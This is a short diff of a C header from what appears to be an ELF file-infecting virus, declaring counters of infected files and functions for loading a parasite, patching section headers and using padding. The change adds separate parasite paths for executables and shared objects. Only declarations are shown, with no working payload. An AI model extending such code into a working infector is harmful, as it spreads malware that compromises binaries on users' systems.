@@ -24,7 +24,8 @@
 extern unsigned long int dir_count;
 extern unsigned long int file_count;
 extern unsigned long int elf_count;
-extern char 			 *parasite_path;
+extern char 			 *parasite_path_for_exec;
+extern char				 *parasite_path_for_so;
 extern unsigned int		 infected_count;
 
 
@@ -61,7 +62,7 @@ void				ElfParser(char *);
 void				FindAndReplace(uint8_t *, long int , long int);
 void				PatchSHT(void *);
 Elf64_Off			GetPaddingSize(void *);
-void				LoadParasite();
+void				LoadParasite(char *);
 void				*mmapFile(char *);
 void				DumpMemory(void *, uint64_t );
 
